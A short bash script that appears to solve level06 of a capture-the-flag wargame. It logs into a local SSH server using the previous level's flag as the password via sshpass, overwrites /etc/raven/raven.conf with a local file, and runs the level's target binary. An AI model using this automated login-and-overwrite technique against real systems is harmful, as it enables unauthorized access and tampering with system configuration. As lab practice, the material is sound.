#! /bin/bash

if ! command -v sshpass
then
    echo -e "Install sshpass command before executing this shell script."
else
    USER="level06"
    ADDRESS="localhost"
    PORT="4242"
    export SSHPASS=$(cat ../../level05/flag)
    echo -e "\nExploiting level06 ssh server ...\n\n\n"
    SRC="raven.conf"
    DST="/etc/raven/raven.conf"

    cat "$SRC" | sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "cat > '$DST'"
    echo -e "copy a file to $DST"

    COMMAND="/opt/snowcrash/level06/raven"

    echo -e "Running remote command:\n$COMMAND\n"
    sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "$COMMAND"
fi
